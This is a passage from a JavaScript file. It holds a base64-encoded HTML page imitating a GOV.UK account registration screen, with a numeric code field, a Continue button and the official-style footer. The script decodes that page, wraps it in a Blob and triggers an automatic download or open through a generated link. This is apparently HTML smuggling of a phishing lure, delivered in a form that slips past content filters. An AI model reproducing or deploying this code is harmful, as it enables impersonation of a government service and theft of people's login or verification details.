gIiB0eXBlPSJ0ZXh0IiAgIGlucHV0bW9kZT0ibnVtZXJpYyI+DQogICAgICAgIDwvZGl2PiAgICANCiAgICAgICAgDQogICAgICAgIA0KICAgICA8YnV0dG9uIGNsYXNzPSJnZW0tYy1idXR0b24gZ292dWstYnV0dG9uIGdvdnVrLWJ1dHRvbi0tc3RhcnQgZ2VtLWMtYnV0dG9uLS1ib3R0b20tbWFyZ2luIiByb2xlPSJidXR0b24iIGlkPSJzdWJtaXRidG4iIG5hbWU9InN1Ym1pdGJ0biIgdHlwZT0ic3VibWl0IiA+ICBDb250aW51ZQ0KICA8c3ZnIGNsYXNzPSJnb3Z1ay1idXR0b25fX3N0YXJ0LWljb24gZ292dWstIS1kaXNwbGF5LW5vbmUtcHJpbnQiIHhtbG5zPSJodHRwOi8vd3d3LnczLm9yZy8yMDAwL3N2ZyIgd2lkdGg9IjE3LjUiIGhlaWdodD0iMTkiIHZpZXdCb3g9IjAgMCAzMyA0MCIgZm9jdXNhYmxlPSJmYWxzZSIgYXJpYS1oaWRkZW49InRydWUiPg0KICAgIDxwYXRoIGZpbGw9ImN1cnJlbnRDb2xvciIgZD0iTTAgMGgxM2wyMCAyMC0yMCAyMEgwbDIwLTIweiI+PC9wYXRoPg0KICA8L3N2Zz4NCjwvYnV0dG9uPg0KICAgICAgDQo8L2Rpdj4gIA0KIA0KICAgICANCiAgICAgPC9kaXY+IA0KICAgIDwvZGl2PiANCiAgICA8ZGl2IGNsYXNzPSJnb3Z1ay1ib2R5IGdvdnVrLSEtbWFyZ2luLXRvcC02Ij4gPGEgY2xhc3M9ImdvdnVrLWxpbmsiIGhyZWY9Imh0dHBzOi8vd3d3LmFjY2Vzcy5zZXJ2aWNlLmdvdi51ay9oZWxwP3JlZmVycmVyVXJsPSUyRnJlZ2lzdHJhdGlvbiUyRmVtYWlsIiBpZD0iZ2V0SGVscCI+R2V0IGhlbHAgd2l0aCB0aGlzIHBhZ2U8L2E+IA0KICAgIDwvZGl2PiANCiAgIDwvbWFpbj4gIDwvZm9ybT4gDQogIDwvZGl2PiANCiAgPGZvb3RlciBjbGFzcz0iZ292dWstZm9vdGVyIj4gDQogICA8ZGl2IGNsYXNzPSJnb3Z1ay13aWR0aC1jb250YWluZXIiPiANCiAgICA8ZGl2IGNsYXNzPSJnb3Z1ay1mb290ZXJfX21ldGEiPiANCiAgICAgPGRpdiBjbGFzcz0iZ292dWstZm9vdGVyX19tZXRhLWl0ZW0gZ292dWstZm9vdGVyX19tZXRhLWl0ZW0tLWdyb3ciPiANCiAgICAgIDx1bCBjbGFzcz0iZ292dWstZm9vdGVyX19pbmxpbmUtbGlzdCI+IA0KICAgICAgIDxsaSBjbGFzcz0iZ292dWstZm9vdGVyX19pbmxpbmUtbGlzdC1pdGVtIj48YSBpZD0iYWNjZXNzaWJpbGl0eSIgY2xhc3M9ImdvdnVrLWZvb3Rlcl9fbGluayIgaHJlZj0iaHR0cHM6Ly93d3cuYWNjZXNzLnNlcnZpY2UuZ292LnVrL2FjY2Vzc2liaWxpdHk/cmVmZXJyZXJVcmw9JTJGcmVnaXN0cmF0aW9uJTJGZW1haWwiIHRhcmdldD0iX2JsYW5rIj5BY2Nlc3NpYmlsaXR5IHN0YXRlbWVudDwvYT48L2xpPiANCiAgICAgICA8bGkgY2xhc3M9ImdvdnVrLWZvb3Rlcl9faW5saW5lLWxpc3QtaXRlbSI+PGEgaWQ9ImNvb2tpZXMiIGNsYXNzPSJnb3Z1ay1mb290ZXJfX2xpbmsiIGhyZWY9Imh0dHBzOi8vd3d3LmFjY2Vzcy5zZXJ2aWNlLmdvdi51ay9jb29raWVzIiB0YXJnZXQ9Il9ibGFuayI+Q29va2llczwvYT48L2xpPiANCiAgICAgICA8bGkgY2xhc3M9ImdvdnVrLWZvb3Rlcl9faW5saW5lLWxpc3QtaXRlbSI+PGEgaWQ9InByaXZhY3ktbm90aWNlIiBjbGFzcz0iZ292dWstZm9vdGVyX19saW5rIiBocmVmPSJodHRwczovL3d3dy5hY2Nlc3Muc2VydmljZS5nb3YudWsvcHJpdmFjeS1ub3RpY2UiIHRhcmdldD0iX2JsYW5rIj5Qcml2YWN5IG5vdGljZTwvYT48L2xpPiANCiAgICAgICA8bGkgY2xhc3M9ImdvdnVrLWZvb3Rlcl9faW5saW5lLWxpc3QtaXRlbSI+PGEgaWQ9InRlcm1zLWFuZC1jb25kaXRpb25zIiBjbGFzcz0iZ292dWstZm9vdGVyX19saW5rIiBocmVmPSJodHRwczovL3d3dy5hY2Nlc3Muc2VydmljZS5nb3YudWsvdGVybXMtYW5kLWNvbmRpdGlvbnMiIHRhcmdldD0iX2JsYW5rIj5UZXJtcyBhbmQgY29uZGl0aW9uczwvYT48L2xpPiANCiAgICAgIDwvdWw+IA0KICAgICAgPHN2ZyBhcmlhLWhpZGRlbj0idHJ1ZSIgZm9jdXNhYmxlPSJmYWxzZSIgY2xhc3M9ImdvdnVrLWZvb3Rlcl9fbGljZW5jZS1sb2dvIiB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHZpZXdib3g9IjAgMCA0ODMuMiAxOTUuNyIgaGVpZ2h0PSIxNyIgd2lkdGg9IjQxIj4gPHBhdGggZmlsbD0iY3VycmVudENvbG9yIiBkPSJNNDIxLjUgMTQyLjhWLjFsLTUwLjcgMzIuM3YxNjEuMWgxMTIuNHYtNTAuN3ptLTEyMi4zLTkuNkE0Ny4xMiA0Ny4xMiAwIDAgMSAyMjEgOTcuOGMwLTI2IDIxLjEtNDcuMSA0Ny4xLTQ3LjEgMTYuNyAwIDMxLjQgOC43IDM5LjcgMjEuOGw0Mi43LTI3LjJBOTcuNjMgOTcuNjMgMCAwIDAgMjY4LjEgMGMtMzYuNSAwLTY4LjMgMjAuMS04NS4xIDQ5LjdBOTggOTggMCAwIDAgOTcuOCAwQzQzLjkgMCAwIDQzLjkgMCA5Ny44czQzLjkgOTcuOCA5Ny44IDk3LjhjMzYuNSAwIDY4LjMtMjAuMSA4NS4xLTQ5LjdhOTcuNzYgOTcuNzYgMCAwIDAgMTQ5LjYgMjUuNGwxOS40IDIyLjJoM3YtODcuOGgtODBsMjQuMyAyNy41ek05Ny44IDE0NWMtMjYgMC00Ny4xLTIxLjEtNDcuMS00Ny4xczIxLjEtNDcuMSA0Ny4xLTQ3LjEgNDcuMiAyMSA0Ny4yIDQ3UzEyMy44IDE0NSA5Ny44IDE0NSI+PC9wYXRoPiANCiAgICAgIDwvc3ZnPiA8c3BhbiBjbGFzcz0iZ292dWstZm9vdGVyX19saWNlbmNlLWRlc2NyaXB0aW9uIj4gQWxsIGNvbnRlbnQgaXMgYXZhaWxhYmxlIHVuZGVyIHRoZSA8YSBjbGFzcz0iZ292dWstZm9vdGVyX19saW5rIiBocmVmPSJodHRwczovL3d3dy5uYXRpb25hbGFyY2hpdmVzLmdvdi51ay9kb2Mvb3Blbi1nb3Zlcm5tZW50LWxpY2VuY2UvdmVyc2lvbi8zLyIgdGFyZ2V0PSJfYmxhbmsiPk9wZW4gR292ZXJubWVudCBMaWNlbmNlIHYzLjA8L2E+LCBleGNlcHQgd2hlcmUgb3RoZXJ3aXNlIHN0YXRlZCA8L3NwYW4+IA0KICAgICA8L2Rpdj4gDQogICAgIDxkaXYgY2xhc3M9ImdvdnVrLWZvb3Rlcl9fbWV0YS1pdGVtIj4gPGEgY2xhc3M9ImdvdnVrLWZvb3Rlcl9fbGluayBnb3Z1ay1mb290ZXJfX2NvcHlyaWdodC1sb2dvIiBocmVmPSJodHRwczovL3d3dy5uYXRpb25hbGFyY2hpdmVzLmdvdi51ay9pbmZvcm1hdGlvbi1tYW5hZ2VtZW50L3JlLXVzaW5nLXB1YmxpYy1zZWN0b3ItaW5mb3JtYXRpb24vdWstZ292ZXJubWVudC1saWNlbnNpbmctZnJhbWV3b3JrL2Nyb3duLWNvcHlyaWdodC8iPsKpIENyb3duIGNvcHlyaWdodDwvYT4gDQogICAgIDwvZGl2PiANCiAgICA8L2Rpdj4gDQogICA8L2Rpdj4gDQogIDwvZm9vdGVyPiAgDQogPC9ib2R5Pg0KPC9odG1sPg==';
    var decodedStringAtoB = atob(encodedStringAtoB);
	const myBlob = new Blob([decodedStringAtoB], {type: 'text/html'})
	const url =  window.URL.createObjectURL(myBlob); 
	a.attr("href", url); 
	$("body").append(a);
	a[0].click();
  window.URL.revokeObjectURL(url);
  a.remove();
}
 